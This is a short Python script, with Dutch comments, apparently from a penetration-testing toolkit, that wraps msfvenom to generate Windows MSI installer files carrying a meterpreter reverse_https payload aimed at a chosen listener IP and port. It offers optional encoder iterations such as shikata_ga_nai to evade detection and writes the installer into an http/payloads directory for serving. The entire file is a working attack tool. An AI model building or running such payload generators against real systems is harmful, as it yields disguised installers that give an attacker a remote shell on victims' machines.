#!/usr/bin/python3

# MSI Installer Payload generator
# Wrapper rond msfvenom voor Windows MSI installer payloads

from meuk.hacksec import *

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP")
parser.add_argument("lport", help="listener port", nargs="?", default="443")
parser.add_argument("payload", help="msfvenom payload type", nargs="?", default="windows/x64/meterpreter/reverse_https")
parser.add_argument("bestand", help="output bestandsnaam (zonder extensie)", nargs="?", default="installer")
parser.add_argument("--encoder", help="msfvenom encoder (bijv. x86/shikata_ga_nai)", default="")
parser.add_argument("--iterations", help="encoder iterations", type=int, default=0)
args = parser.parse_args()

output_path = f"http/payloads/{args.bestand}.msi"

print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating MSI payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")

msf_cmd = ["msfvenom", "-p", args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}"]
if args.encoder:
    msf_cmd.extend(["-e", args.encoder])
    if args.iterations > 0:
        msf_cmd.extend(["-i", str(args.iterations)])
msf_cmd.extend(["-f", "msi", "-o", output_path])

result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

if result.returncode != 0:
    print(f"{bcolors.BOLD}{bcolors.FAIL}[x] msfvenom stderr:{bcolors.ENDC}\n{result.stderr.decode('utf-8', errors='replace')}")
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful (rc={result.returncode}). Are you sure msfvenom is installed?{bcolors.ENDC}")

stdout_output = result.stdout.decode("utf-8", errors="replace").strip()
if stdout_output:
    print(stdout_output)

print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] MSI installer geschreven naar: {output_path}{bcolors.ENDC}")
